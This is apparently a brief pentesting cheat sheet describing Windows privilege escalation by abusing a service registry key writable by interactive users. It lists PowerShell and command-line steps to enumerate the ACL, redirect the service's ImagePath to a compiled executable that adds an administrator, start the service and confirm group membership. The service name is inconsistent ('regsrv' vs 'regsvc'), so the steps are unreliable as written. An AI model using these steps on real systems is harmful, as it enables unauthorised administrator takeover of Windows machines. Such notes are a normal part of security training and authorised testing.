# Service Registry ACL Privilege Escalation
Enumeration using PowerShell:
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsrv | fl
```
Check the output for 'NT AUTHORITY\INTERACTIVE' has 'Allow FullControl'<br>
Create a malicious service:<br>
https://github.com/sagishahar/scripts/blob/master/windows_service.c<br>
Update code to add a new administrator user<br>
Compile.<br>
Install the malicious executable:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsrv /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
Restart the service
```
sc start regsvc
```
Confirm by checking the administrators group membership
```
net localgroup administrators
```
